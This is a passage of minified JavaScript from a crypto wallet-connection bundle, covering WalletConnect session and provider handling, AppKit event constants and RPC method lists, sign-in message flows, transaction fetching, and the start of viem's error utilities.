this.persist("optionalNamespaces",this.optionalNamespaces),this.onConnect(),this.session}setDefaultChain(e,r){try{if(!this.session)return;const[n,i]=this.validateChain(e),s=this.getProvider(n);s.name===Ka?s.setDefaultChain(`${n}:${i}`,r):s.setDefaultChain(i,r)}catch(n){if(!/Please call connect/.test(n.message))throw n}}async cleanupPendingPairings(e={}){this.logger.info("Cleaning up inactive pairings...");const r=this.client.pairing.getAll();if(Js(r)){for(const n of r)e.deletePairings?this.client.core.expirer.set(n.topic,0):await this.client.core.relayer.subscriber.unsubscribe(n.topic);this.logger.info(`Inactive pairings cleared: ${r.length}`)}}abortPairingAttempt(){this.logger.warn("abortPairingAttempt is deprecated. This is now a no-op.")}async checkStorage(){this.namespaces=await this.getFromStore("namespaces")||{},this.optionalNamespaces=await this.getFromStore("optionalNamespaces")||{},this.session&&this.createProviders()}async initialize(){this.logger.trace("Initialized"),await this.createClient(),await this.checkStorage(),this.registerEventListeners()}async createClient(){var e,r;if(this.client=this.providerOpts.client||await Z$.init({core:this.providerOpts.core,logger:this.providerOpts.logger||Vv,relayUrl:this.providerOpts.relayUrl||cL,projectId:this.providerOpts.projectId,metadata:this.providerOpts.metadata,storageOptions:this.providerOpts.storageOptions,storage:this.providerOpts.storage,name:this.providerOpts.name,customStoragePrefix:this.providerOpts.customStoragePrefix,telemetryEnabled:this.providerOpts.telemetryEnabled}),this.providerOpts.session)try{this.session=this.client.session.get(this.providerOpts.session.topic)}catch(n){throw this.logger.error("Failed to get session",n),new Error(`The provided session: ${(r=(e=this.providerOpts)==null?void 0:e.session)==null?void 0:r.topic} doesn't exist in the Sign client`)}else{const n=this.client.session.getAll();this.session=n[0]}this.logger.trace("SignClient Initialized")}createProviders(){if(!this.client)throw new Error("Sign Client not initialized");if(!this.session)throw new Error("Session not initialized. Please call connect() before enable()");const e=[...new Set(Object.keys(this.session.namespaces).map(r=>Au(r)))];gg("client",this.client),gg("events",this.events),gg("disableProviderPing",this.disableProviderPing),e.forEach(r=>{if(!this.session)return;const n=WL(r,this.session),i=uI(n),s=fg(this.namespaces,this.optionalNamespaces),o=mg(Lh({},s[r]),{accounts:n,chains:i});switch(r){case"eip155":this.rpcProviders[r]=new eF({namespace:o});break;case"algorand":this.rpcProviders[r]=new uF({namespace:o});break;case"solana":this.rpcProviders[r]=new nF({namespace:o});break;case"cosmos":this.rpcProviders[r]=new oF({namespace:o});break;case"polkadot":this.rpcProviders[r]=new KL({namespace:o});break;case"cip34":this.rpcProviders[r]=new dF({namespace:o});break;case"elrond":this.rpcProviders[r]=new gF({namespace:o});break;case"multiversx":this.rpcProviders[r]=new wF({namespace:o});break;case"near":this.rpcProviders[r]=new EF({namespace:o});break;case"tezos":this.rpcProviders[r]=new CF({namespace:o});break;default:this.rpcProviders[Ka]?this.rpcProviders[Ka].updateNamespace(o):this.rpcProviders[Ka]=new SF({namespace:o})}})}registerEventListeners(){if(typeof this.client>"u")throw new Error("Sign Client is not initialized");this.client.on("session_ping",e=>{var r;const{topic:n}=e;n===((r=this.session)==null?void 0:r.topic)&&this.events.emit("session_ping",e)}),this.client.on("session_event",e=>{var r;const{params:n,topic:i}=e;if(i!==((r=this.session)==null?void 0:r.topic))return;const{event:s}=n;if(s.name==="accountsChanged"){const o=s.data;o&&Js(o)&&this.events.emit("accountsChanged",o.map(eE))}else if(s.name==="chainChanged"){const o=n.chainId,a=n.event.data,c=Au(o),u=pg(o)!==pg(a)?`${c}:${pg(a)}`:o;this.onChainChanged(u)}else this.events.emit(s.name,s.data);this.events.emit("session_event",e)}),this.client.on("session_update",({topic:e,params:r})=>{var n,i;if(e!==((n=this.session)==null?void 0:n.topic))return;const{namespaces:s}=r,o=(i=this.client)==null?void 0:i.session.get(e);this.session=mg(Lh({},o),{namespaces:s}),this.onSessionUpdate(),this.events.emit("session_update",{topic:e,params:r})}),this.client.on("session_delete",async e=>{var r;e.topic===((r=this.session)==null?void 0:r.topic)&&(await this.cleanup(),this.events.emit("session_delete",e),this.events.emit("disconnect",mg(Lh({},ht("USER_DISCONNECTED")),{data:e.topic})))}),this.on(Yn.DEFAULT_CHAIN_CHANGED,e=>{this.onChainChanged(e,!0)})}getProvider(e){return this.rpcProviders[e]||this.rpcProviders[Ka]}onSessionUpdate(){Object.keys(this.rpcProviders).forEach(e=>{var r;this.getProvider(e).updateNamespace((r=this.session)==null?void 0:r.namespaces[e])})}setNamespaces(e){const{namespaces:r,optionalNamespaces:n,sessionProperties:i,scopedProperties:s}=e;r&&Object.keys(r).length&&(this.namespaces=r),n&&Object.keys(n).length&&(this.optionalNamespaces=n),this.sessionProperties=i,this.scopedProperties=s}validateChain(e){const[r,n]=(e==null?void 0:e.split(":"))||["",""];if(!this.namespaces||!Object.keys(this.namespaces).length)return[r,n];if(r&&!Object.keys(this.namespaces||{}).map(o=>Au(o)).includes(r))throw new Error(`Namespace '${r}' is not configured. Please call connect() first with namespace config.`);if(r&&n)return[r,n];const i=Au(Object.keys(this.namespaces)[0]),s=this.rpcProviders[i].getDefaultChain();return[i,s]}async requestAccounts(){const[e]=this.validateChain();return await this.getProvider(e).requestAccounts()}async onChainChanged(e,r=!1){if(!this.namespaces)return;const[n,i]=this.validateChain(e);if(!i)return;this.updateNamespaceChain(n,i),this.events.emit("chainChanged",i);const s=this.getProvider(n).getDefaultChain();r||this.getProvider(n).setDefaultChain(i),this.emitAccountsChangedOnChainChange({namespace:n,previousChainId:s,newChainId:e}),await this.persist("namespaces",this.namespaces)}emitAccountsChangedOnChainChange({namespace:e,previousChainId:r,newChainId:n}){var i,s;try{if(r===n)return;const o=(s=(i=this.session)==null?void 0:i.namespaces[e])==null?void 0:s.accounts;if(!o)return;const a=o.filter(c=>c.includes(`${n}:`)).map(eE);if(!Js(a))return;this.events.emit("accountsChanged",a)}catch(o){this.logger.warn("Failed to emit accountsChanged on chain change",o)}}updateNamespaceChain(e,r){if(!this.namespaces)return;const n=this.namespaces[e]?e:`${e}:${r}`,i={chains:[],methods:[],events:[],defaultChain:r};this.namespaces[n]?this.namespaces[n]&&(this.namespaces[n].defaultChain=r):this.namespaces[n]=i}onConnect(){this.createProviders(),this.events.emit("connect",{session:this.session})}async cleanup(){this.namespaces=void 0,this.optionalNamespaces=void 0,this.sessionProperties=void 0,await this.deleteFromStore("namespaces"),await this.deleteFromStore("optionalNamespaces"),await this.deleteFromStore("sessionProperties"),this.session=void 0,await this.cleanupPendingPairings({deletePairings:!0}),await this.cleanupStorage()}async persist(e,r){var n;const i=((n=this.session)==null?void 0:n.topic)||"";await this.client.core.storage.setItem(`${Uh}/${e}${i}`,r)}async getFromStore(e){var r;const n=((r=this.session)==null?void 0:r.topic)||"";return await this.client.core.storage.getItem(`${Uh}/${e}${n}`)}async deleteFromStore(e){var r;const n=((r=this.session)==null?void 0:r.topic)||"";await this.client.core.storage.removeItem(`${Uh}/${e}${n}`)}async cleanupStorage(){var e;try{if(((e=this.client)==null?void 0:e.session.length)>0)return;const r=await this.client.core.storage.getKeys();for(const n of r)n.startsWith(Uh)&&await this.client.core.storage.removeItem(n)}catch(r){this.logger.warn("Failed to cleanup storage",r)}}};var bc={};const DF="https://secure.walletconnect.org/sdk",MF=(typeof process<"u"&&typeof bc<"u"?bc.NEXT_PUBLIC_SECURE_SITE_SDK_URL:void 0)||DF,BF=(typeof process<"u"&&typeof bc<"u"?bc.NEXT_PUBLIC_DEFAULT_LOG_LEVEL:void 0)||"error",UF=(typeof process<"u"&&typeof bc<"u"?bc.NEXT_PUBLIC_SECURE_SITE_SDK_VERSION:void 0)||"4",me={APP_EVENT_KEY:"@w3m-app/",FRAME_EVENT_KEY:"@w3m-frame/",RPC_METHOD_KEY:"RPC_",STORAGE_KEY:"@appkit-wallet/",SESSION_TOKEN_KEY:"SESSION_TOKEN_KEY",EMAIL_LOGIN_USED_KEY:"EMAIL_LOGIN_USED_KEY",LAST_USED_CHAIN_KEY:"LAST_USED_CHAIN_KEY",LAST_EMAIL_LOGIN_TIME:"LAST_EMAIL_LOGIN_TIME",EMAIL:"EMAIL",PREFERRED_ACCOUNT_TYPE:"PREFERRED_ACCOUNT_TYPE",SMART_ACCOUNT_ENABLED:"SMART_ACCOUNT_ENABLED",SMART_ACCOUNT_ENABLED_NETWORKS:"SMART_ACCOUNT_ENABLED_NETWORKS",SOCIAL_USERNAME:"SOCIAL_USERNAME",APP_SWITCH_NETWORK:"@w3m-app/SWITCH_NETWORK",APP_CONNECT_EMAIL:"@w3m-app/CONNECT_EMAIL",APP_CONNECT_DEVICE:"@w3m-app/CONNECT_DEVICE",APP_CONNECT_OTP:"@w3m-app/CONNECT_OTP",APP_CONNECT_SOCIAL:"@w3m-app/CONNECT_SOCIAL",APP_GET_SOCIAL_REDIRECT_URI:"@w3m-app/GET_SOCIAL_REDIRECT_URI",APP_GET_USER:"@w3m-app/GET_USER",APP_SIGN_OUT:"@w3m-app/SIGN_OUT",APP_IS_CONNECTED:"@w3m-app/IS_CONNECTED",APP_GET_CHAIN_ID:"@w3m-app/GET_CHAIN_ID",APP_RPC_REQUEST:"@w3m-app/RPC_REQUEST",APP_UPDATE_EMAIL:"@w3m-app/UPDATE_EMAIL",APP_UPDATE_EMAIL_PRIMARY_OTP:"@w3m-app/UPDATE_EMAIL_PRIMARY_OTP",APP_UPDATE_EMAIL_SECONDARY_OTP:"@w3m-app/UPDATE_EMAIL_SECONDARY_OTP",APP_AWAIT_UPDATE_EMAIL:"@w3m-app/AWAIT_UPDATE_EMAIL",APP_SYNC_THEME:"@w3m-app/SYNC_THEME",APP_SYNC_DAPP_DATA:"@w3m-app/SYNC_DAPP_DATA",APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS:"@w3m-app/GET_SMART_ACCOUNT_ENABLED_NETWORKS",APP_INIT_SMART_ACCOUNT:"@w3m-app/INIT_SMART_ACCOUNT",APP_SET_PREFERRED_ACCOUNT:"@w3m-app/SET_PREFERRED_ACCOUNT",APP_CONNECT_FARCASTER:"@w3m-app/CONNECT_FARCASTER",APP_GET_FARCASTER_URI:"@w3m-app/GET_FARCASTER_URI",APP_RELOAD:"@w3m-app/RELOAD",FRAME_SWITCH_NETWORK_ERROR:"@w3m-frame/SWITCH_NETWORK_ERROR",FRAME_SWITCH_NETWORK_SUCCESS:"@w3m-frame/SWITCH_NETWORK_SUCCESS",FRAME_CONNECT_EMAIL_ERROR:"@w3m-frame/CONNECT_EMAIL_ERROR",FRAME_CONNECT_EMAIL_SUCCESS:"@w3m-frame/CONNECT_EMAIL_SUCCESS",FRAME_CONNECT_DEVICE_ERROR:"@w3m-frame/CONNECT_DEVICE_ERROR",FRAME_CONNECT_DEVICE_SUCCESS:"@w3m-frame/CONNECT_DEVICE_SUCCESS",FRAME_CONNECT_OTP_SUCCESS:"@w3m-frame/CONNECT_OTP_SUCCESS",FRAME_CONNECT_OTP_ERROR:"@w3m-frame/CONNECT_OTP_ERROR",FRAME_CONNECT_SOCIAL_SUCCESS:"@w3m-frame/CONNECT_SOCIAL_SUCCESS",FRAME_CONNECT_SOCIAL_ERROR:"@w3m-frame/CONNECT_SOCIAL_ERROR",FRAME_CONNECT_FARCASTER_SUCCESS:"@w3m-frame/CONNECT_FARCASTER_SUCCESS",FRAME_CONNECT_FARCASTER_ERROR:"@w3m-frame/CONNECT_FARCASTER_ERROR",FRAME_GET_FARCASTER_URI_SUCCESS:"@w3m-frame/GET_FARCASTER_URI_SUCCESS",FRAME_GET_FARCASTER_URI_ERROR:"@w3m-frame/GET_FARCASTER_URI_ERROR",FRAME_GET_SOCIAL_REDIRECT_URI_SUCCESS:"@w3m-frame/GET_SOCIAL_REDIRECT_URI_SUCCESS",FRAME_GET_SOCIAL_REDIRECT_URI_ERROR:"@w3m-frame/GET_SOCIAL_REDIRECT_URI_ERROR",FRAME_GET_USER_SUCCESS:"@w3m-frame/GET_USER_SUCCESS",FRAME_GET_USER_ERROR:"@w3m-frame/GET_USER_ERROR",FRAME_SIGN_OUT_SUCCESS:"@w3m-frame/SIGN_OUT_SUCCESS",FRAME_SIGN_OUT_ERROR:"@w3m-frame/SIGN_OUT_ERROR",FRAME_IS_CONNECTED_SUCCESS:"@w3m-frame/IS_CONNECTED_SUCCESS",FRAME_IS_CONNECTED_ERROR:"@w3m-frame/IS_CONNECTED_ERROR",FRAME_GET_CHAIN_ID_SUCCESS:"@w3m-frame/GET_CHAIN_ID_SUCCESS",FRAME_GET_CHAIN_ID_ERROR:"@w3m-frame/GET_CHAIN_ID_ERROR",FRAME_RPC_REQUEST_SUCCESS:"@w3m-frame/RPC_REQUEST_SUCCESS",FRAME_RPC_REQUEST_ERROR:"@w3m-frame/RPC_REQUEST_ERROR",FRAME_SESSION_UPDATE:"@w3m-frame/SESSION_UPDATE",FRAME_UPDATE_EMAIL_SUCCESS:"@w3m-frame/UPDATE_EMAIL_SUCCESS",FRAME_UPDATE_EMAIL_ERROR:"@w3m-frame/UPDATE_EMAIL_ERROR",FRAME_UPDATE_EMAIL_PRIMARY_OTP_SUCCESS:"@w3m-frame/UPDATE_EMAIL_PRIMARY_OTP_SUCCESS",FRAME_UPDATE_EMAIL_PRIMARY_OTP_ERROR:"@w3m-frame/UPDATE_EMAIL_PRIMARY_OTP_ERROR",FRAME_UPDATE_EMAIL_SECONDARY_OTP_SUCCESS:"@w3m-frame/UPDATE_EMAIL_SECONDARY_OTP_SUCCESS",FRAME_UPDATE_EMAIL_SECONDARY_OTP_ERROR:"@w3m-frame/UPDATE_EMAIL_SECONDARY_OTP_ERROR",FRAME_SYNC_THEME_SUCCESS:"@w3m-frame/SYNC_THEME_SUCCESS",FRAME_SYNC_THEME_ERROR:"@w3m-frame/SYNC_THEME_ERROR",FRAME_SYNC_DAPP_DATA_SUCCESS:"@w3m-frame/SYNC_DAPP_DATA_SUCCESS",FRAME_SYNC_DAPP_DATA_ERROR:"@w3m-frame/SYNC_DAPP_DATA_ERROR",FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS:"@w3m-frame/GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS",FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR:"@w3m-frame/GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR",FRAME_INIT_SMART_ACCOUNT_SUCCESS:"@w3m-frame/INIT_SMART_ACCOUNT_SUCCESS",FRAME_INIT_SMART_ACCOUNT_ERROR:"@w3m-frame/INIT_SMART_ACCOUNT_ERROR",FRAME_SET_PREFERRED_ACCOUNT_SUCCESS:"@w3m-frame/SET_PREFERRED_ACCOUNT_SUCCESS",FRAME_SET_PREFERRED_ACCOUNT_ERROR:"@w3m-frame/SET_PREFERRED_ACCOUNT_ERROR",FRAME_READY:"@w3m-frame/READY",FRAME_RELOAD_SUCCESS:"@w3m-frame/RELOAD_SUCCESS",FRAME_RELOAD_ERROR:"@w3m-frame/RELOAD_ERROR",RPC_RESPONSE_TYPE_ERROR:"RPC_RESPONSE_ERROR",RPC_RESPONSE_TYPE_TX:"RPC_RESPONSE_TRANSACTION_HASH",RPC_RESPONSE_TYPE_OBJECT:"RPC_RESPONSE_OBJECT"},cr={SAFE_RPC_METHODS:["eth_accounts","eth_blockNumber","eth_call","eth_chainId","eth_estimateGas","eth_feeHistory","eth_gasPrice","eth_getAccount","eth_getBalance","eth_getBlockByHash","eth_getBlockByNumber","eth_getBlockReceipts","eth_getBlockTransactionCountByHash","eth_getBlockTransactionCountByNumber","eth_getCode","eth_getFilterChanges","eth_getFilterLogs","eth_getLogs","eth_getProof","eth_getStorageAt","eth_getTransactionByBlockHashAndIndex","eth_getTransactionByBlockNumberAndIndex","eth_getTransactionByHash","eth_getTransactionCount","eth_getTransactionReceipt","eth_getUncleCountByBlockHash","eth_getUncleCountByBlockNumber","eth_maxPriorityFeePerGas","eth_newBlockFilter","eth_newFilter","eth_newPendingTransactionFilter","eth_sendRawTransaction","eth_syncing","eth_uninstallFilter","wallet_getCapabilities","wallet_getCallsStatus","eth_getUserOperationReceipt","eth_estimateUserOperationGas","eth_getUserOperationByHash","eth_supportedEntryPoints","wallet_getAssets"],NOT_SAFE_RPC_METHODS:["personal_sign","eth_signTypedData_v4","eth_sendTransaction","solana_signMessage","solana_signTransaction","solana_signAllTransactions","solana_signAndSendTransaction","wallet_sendCalls","wallet_grantPermissions","wallet_revokePermissions","eth_sendUserOperation"],GET_CHAIN_ID:"eth_chainId",RPC_METHOD_NOT_ALLOWED_MESSAGE:"Requested RPC call is not allowed",RPC_METHOD_NOT_ALLOWED_UI_MESSAGE:"Action not allowed",ACCOUNT_TYPES:{EOA:"eoa",SMART_ACCOUNT:"smartAccount"}},Po=Object.freeze({message:"",variant:"success",svg:void 0,open:!1,autoClose:!0}),ur=Kt({...Po}),kr={state:ur,subscribeKey(t,e){return tn(ur,t,e)},showLoading(t,e={}){this._showMessage({message:t,variant:"loading",...e})},showSuccess(t){this._showMessage({message:t,variant:"success"})},showSvg(t,e){this._showMessage({message:t,svg:e})},showError(t){const e=Ie.parseError(t);this._showMessage({message:e,variant:"error"})},hide(){ur.message=Po.message,ur.variant=Po.variant,ur.svg=Po.svg,ur.open=Po.open,ur.autoClose=Po.autoClose},_showMessage({message:t,svg:e,variant:r="success",autoClose:n=Po.autoClose}){ur.open?(ur.open=!1,setTimeout(()=>{ur.message=t,ur.variant=r,ur.svg=e,ur.open=!0,ur.autoClose=n},150)):(ur.message=t,ur.variant=r,ur.svg=e,ur.open=!0,ur.autoClose=n)}},Ru={getSIWX(){return te.state.siwx},async initializeIfEnabled(){var s;const t=te.state.siwx,e=q.getActiveCaipAddress();if(!(t&&e))return;const[r,n,i]=e.split(":");if(q.checkIfSupportedNetwork(r))try{if((await t.getSessions(`${r}:${n}`,i)).length)return;await nr.open({view:"SIWXSignMessage"})}catch(o){console.error("SIWXUtil:initializeIfEnabled",o),wt.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:this.getSIWXEventProperties()}),await((s=At._getClient())==null?void 0:s.disconnect().catch(console.error)),at.reset("Connect"),kr.showError("A problem occurred while trying initialize authentication")}},async requestSignMessage(){const t=te.state.siwx,e=Ie.getPlainAddress(q.getActiveCaipAddress()),r=q.getActiveCaipNetwork(),n=At._getClient();if(!t)throw new Error("SIWX is not enabled");if(!e)throw new Error("No ActiveCaipAddress found");if(!r)throw new Error("No ActiveCaipNetwork or client found");if(!n)throw new Error("No ConnectionController client found");try{const i=await t.createMessage({chainId:r.caipNetworkId,accountAddress:e}),s=i.toString();Oe.getConnectorId(r.chainNamespace)===Z.CONNECTOR_ID.AUTH&&at.pushTransactionStack({view:null,goBack:!1,replace:!0});const a=await n.signMessage(s);await t.addSession({data:i,message:s,signature:a}),nr.close(),wt.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:this.getSIWXEventProperties()})}catch(i){const s=this.getSIWXEventProperties();(!nr.state.open||at.state.view==="ApproveTransaction")&&await nr.open({view:"SIWXSignMessage"}),s.isSmartAccount?kr.showError("This application might not support Smart Accounts"):kr.showError("Signature declined"),wt.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:s}),console.error("SWIXUtil:requestSignMessage",i)}},async cancelSignMessage(){var t;try{const e=this.getSIWX();((t=e==null?void 0:e.getRequired)==null?void 0:t.call(e))?await At.disconnect():nr.close(),at.reset("Connect"),wt.sendEvent({event:"CLICK_CANCEL_SIWX",type:"track",properties:this.getSIWXEventProperties()})}catch(e){console.error("SIWXUtil:cancelSignMessage",e)}},async getSessions(){const t=te.state.siwx,e=Ie.getPlainAddress(q.getActiveCaipAddress()),r=q.getActiveCaipNetwork();return t&&e&&r?t.getSessions(r.caipNetworkId,e):[]},async isSIWXCloseDisabled(){var e;const t=this.getSIWX();if(t){const r=at.state.view==="ApproveTransaction",n=at.state.view==="SIWXSignMessage";if(r||n)return((e=t.getRequired)==null?void 0:e.call(t))&&(await this.getSessions()).length===0}return!1},async universalProviderAuthenticate({universalProvider:t,chains:e,methods:r}){var a,c,u;const n=Ru.getSIWX(),i=new Set(e.map(l=>l.split(":")[0]));if(!n||i.size!==1||!i.has("eip155"))return!1;const s=await n.createMessage({chainId:((a=q.getActiveCaipNetwork())==null?void 0:a.caipNetworkId)||"",accountAddress:""}),o=await t.authenticate({nonce:s.nonce,domain:s.domain,uri:s.uri,exp:s.expirationTime,iat:s.issuedAt,nbf:s.notBefore,requestId:s.requestId,version:s.version,resources:s.resources,statement:s.statement,chainId:s.chainId,methods:r,chains:[s.chainId,...e.filter(l=>l!==s.chainId)]});if(kr.showLoading("Authenticating...",{autoClose:!1}),pe.setConnectedWalletInfo({...o.session.peer.metadata,name:o.session.peer.metadata.name,icon:(c=o.session.peer.metadata.icons)==null?void 0:c[0],type:"WALLET_CONNECT"},Array.from(i)[0]),(u=o==null?void 0:o.auths)!=null&&u.length){const l=o.auths.map(h=>{const d=t.client.formatAuthMessage({request:h.p,iss:h.p.iss});return{data:{...h.p,accountAddress:h.p.iss.split(":").slice(-1).join(""),chainId:h.p.iss.split(":").slice(2,4).join(":"),uri:h.p.aud,version:h.p.version||s.version,expirationTime:h.p.exp,issuedAt:h.p.iat,notBefore:h.p.nbf},message:d,signature:h.s.s,cacao:h}});try{await n.setSessions(l),wt.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:Ru.getSIWXEventProperties()})}catch(h){throw console.error("SIWX:universalProviderAuth - failed to set sessions",h),wt.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:Ru.getSIWXEventProperties()}),await t.disconnect().catch(console.error),h}finally{kr.hide()}}return!0},getSIWXEventProperties(){var e,r;const t=q.state.activeChain;return{network:((e=q.state.activeCaipNetwork)==null?void 0:e.caipNetworkId)||"",isSmartAccount:((r=pe.state.preferredAccountTypes)==null?void 0:r[t])===cr.ACCOUNT_TYPES.SMART_ACCOUNT}},async clearSessions(){const t=this.getSIWX();t&&await t.setSessions([])}},vt=Kt({transactions:[],coinbaseTransactions:{},transactionsByYear:{},lastNetworkInView:void 0,loading:!1,empty:!1,next:void 0}),$F={state:vt,subscribe(t){return Xr(vt,()=>t(vt))},setLastNetworkInView(t){vt.lastNetworkInView=t},async fetchTransactions(t,e){var r,n;if(!t)throw new Error("Transactions can't be fetched without an accountAddress");vt.loading=!0;try{const i=await _e.fetchTransactions({account:t,cursor:vt.next,onramp:e,cache:e==="coinbase"?"no-cache":void 0,chainId:(r=q.state.activeCaipNetwork)==null?void 0:r.caipNetworkId}),s=this.filterSpamTransactions(i.data),o=this.filterByConnectedChain(s),a=[...vt.transactions,...o];vt.loading=!1,e==="coinbase"?vt.coinbaseTransactions=this.groupTransactionsByYearAndMonth(vt.coinbaseTransactions,i.data):(vt.transactions=a,vt.transactionsByYear=this.groupTransactionsByYearAndMonth(vt.transactionsByYear,o)),vt.empty=a.length===0,vt.next=i.next?i.next:void 0}catch{const s=q.state.activeChain;wt.sendEvent({type:"track",event:"ERROR_FETCH_TRANSACTIONS",properties:{address:t,projectId:te.state.projectId,cursor:vt.next,isSmartAccount:((n=pe.state.preferredAccountTypes)==null?void 0:n[s])===cr.ACCOUNT_TYPES.SMART_ACCOUNT}}),kr.showError("Failed to fetch transactions"),vt.loading=!1,vt.empty=!0,vt.next=void 0}},groupTransactionsByYearAndMonth(t={},e=[]){const r=t;return e.forEach(n=>{const i=new Date(n.metadata.minedAt).getFullYear(),s=new Date(n.metadata.minedAt).getMonth(),o=r[i]??{},c=(o[s]??[]).filter(u=>u.id!==n.id);r[i]={...o,[s]:[...c,n].sort((u,l)=>new Date(l.metadata.minedAt).getTime()-new Date(u.metadata.minedAt).getTime())}}),r},filterSpamTransactions(t){return t.filter(e=>!e.transfers.every(n=>{var i;return((i=n.nft_info)==null?void 0:i.flags.is_spam)===!0}))},filterByConnectedChain(t){var n;const e=(n=q.state.activeCaipNetwork)==null?void 0:n.caipNetworkId;return t.filter(i=>i.metadata.chain===e)},clearCursor(){vt.next=void 0},resetTransactions(){vt.transactions=[],vt.transactionsByYear={},vt.lastNetworkInView=void 0,vt.loading=!1,vt.empty=!1,vt.next=void 0}},Et=Kt({wcError:!1,buffering:!1,status:"disconnected"});let qa;const At={state:Et,subscribeKey(t,e){return tn(Et,t,e)},_getClient(){return Et._client},setClient(t){Et._client=Jo(t)},async connectWalletConnect(){var t,e,r,n;if(Ie.isTelegram()||Ie.isSafari()&&Ie.isIos()){if(qa){await qa,qa=void 0;return}if(!Ie.isPairingExpired(Et==null?void 0:Et.wcPairingExpiry)){const i=Et.wcUri;Et.wcUri=i;return}qa=(e=(t=this._getClient())==null?void 0:t.connectWalletConnect)==null?void 0:e.call(t).catch(()=>{}),this.state.status="connecting",await qa,qa=void 0,Et.wcPairingExpiry=void 0,this.state.status="connected"}else await((n=(r=this._getClient())==null?void 0:r.connectWalletConnect)==null?void 0:n.call(r))},async connectExternal(t,e,r=!0){var n,i;await((i=(n=this._getClient())==null?void 0:n.connectExternal)==null?void 0:i.call(n,t)),r&&q.setActiveNamespace(e)},async reconnectExternal(t){var r,n;await((n=(r=this._getClient())==null?void 0:r.reconnectExternal)==null?void 0:n.call(r,t));const e=t.chain||q.state.activeChain;e&&Oe.setConnectorId(t.id,e)},async setPreferredAccountType(t,e){var n;nr.setLoading(!0,q.state.activeChain);const r=Oe.getAuthConnector();r&&(pe.setPreferredAccountType(t,e),await r.provider.setPreferredAccount(t),le.setPreferredAccountTypes(pe.state.preferredAccountTypes??{[e]:t}),await this.reconnectExternal(r),nr.setLoading(!1,q.state.activeChain),wt.sendEvent({type:"track",event:"SET_PREFERRED_ACCOUNT_TYPE",properties:{accountType:t,network:((n=q.state.activeCaipNetwork)==null?void 0:n.caipNetworkId)||""}}))},async signMessage(t){var e;return(e=this._getClient())==null?void 0:e.signMessage(t)},parseUnits(t,e){var r;return(r=this._getClient())==null?void 0:r.parseUnits(t,e)},formatUnits(t,e){var r;return(r=this._getClient())==null?void 0:r.formatUnits(t,e)},async sendTransaction(t){var e;return(e=this._getClient())==null?void 0:e.sendTransaction(t)},async getCapabilities(t){var e;return(e=this._getClient())==null?void 0:e.getCapabilities(t)},async grantPermissions(t){var e;return(e=this._getClient())==null?void 0:e.grantPermissions(t)},async walletGetAssets(t){var e;return((e=this._getClient())==null?void 0:e.walletGetAssets(t))??{}},async estimateGas(t){var e;return(e=this._getClient())==null?void 0:e.estimateGas(t)},async writeContract(t){var e;return(e=this._getClient())==null?void 0:e.writeContract(t)},async getEnsAddress(t){var e;return(e=this._getClient())==null?void 0:e.getEnsAddress(t)},async getEnsAvatar(t){var e;return(e=this._getClient())==null?void 0:e.getEnsAvatar(t)},checkInstalled(t){var e,r;return((r=(e=this._getClient())==null?void 0:e.checkInstalled)==null?void 0:r.call(e,t))||!1},resetWcConnection(){Et.wcUri=void 0,Et.wcPairingExpiry=void 0,Et.wcLinking=void 0,Et.recentWallet=void 0,Et.status="disconnected",$F.resetTransactions(),le.deleteWalletConnectDeepLink()},resetUri(){Et.wcUri=void 0,Et.wcPairingExpiry=void 0},finalizeWcConnection(){var r,n;const{wcLinking:t,recentWallet:e}=At.state;t&&le.setWalletConnectDeepLink(t),e&&le.setAppKitRecent(e),wt.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:t?"mobile":"qrcode",name:((n=(r=at.state.data)==null?void 0:r.wallet)==null?void 0:n.name)||"Unknown"}})},setWcBasic(t){Et.wcBasic=t},setUri(t){Et.wcUri=t,Et.wcPairingExpiry=Ie.getPairingExpiry()},setWcLinking(t){Et.wcLinking=t},setWcError(t){Et.wcError=t,Et.buffering=!1},setRecentWallet(t){Et.recentWallet=t},setBuffering(t){Et.buffering=t},setStatus(t){Et.status=t},async disconnect(t){try{nr.setLoading(!0,t),await Ru.clearSessions(),await q.disconnect(t),nr.setLoading(!1,t),Oe.setFilterByNamespace(void 0)}catch{throw new Error("Failed to disconnect")}}},za=Kt({loading:!1,open:!1,selectedNetworkId:void 0,activeChain:void 0,initialized:!1}),$i={state:za,subscribe(t){return Xr(za,()=>t(za))},subscribeOpen(t){return tn(za,"open",t)},set(t){Object.assign(za,{...za,...t})}};function dt(t,e,r){const n=t[e.name];if(typeof n=="function")return n;const i=t[r];return typeof i=="function"?i:s=>e(t,s)}function Fi(t,{includeName:e=!1}={}){if(t.type!=="function"&&t.type!=="event"&&t.type!=="error")throw new YF(t.type);return`${t.name}(${$f(t.inputs,{includeName:e})})`}function $f(t,{includeName:e=!1}={}){return t?t.map(r=>LF(r,{includeName:e})).join(e?", ":","):""}function LF(t,{includeName:e}){return t.type.startsWith("tuple")?`(${$f(t.components,{includeName:e})})${t.type.slice(5)}`:t.type+(e&&t.name?` ${t.name}`:"")}function ws(t,{strict:e=!0}={}){return!t||typeof t!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(t):t.startsWith("0x")}function Ir(t){return ws(t,{strict:!1})?Math.ceil((t.length-2)/2):t.length}const dI="2.27.0";let lu={getDocsUrl:({docsBaseUrl:t,docsPath:e="",docsSlug:r})=>e?`${t??"https://viem.sh"}${e}${r?`#${r}`:""}`:void 0,version:`viem@${dI}`},Y=class s0 extends Error{constructor(e,r={}){var a;const n=(()=>{var c;return r.cause instanceof s0?r.cause.details:(c=r.cause)!=null&&c.message?r.cause.message:r.details})(),i=r.cause instanceof s0&&r.cause.docsPath||r.docsPath,s=(a=lu.getDocsUrl)==null?void 0:a.call(lu,{...r,docsPath:i}),o=[e||"An error occurred.","",...r.metaMessages?[...r.metaMessages,""]:[],...s?[`Docs: ${s}`]:[],...n?[`Details: ${n}`]:[],...lu.version?[`Version: ${lu.version}`]:[]].join(`
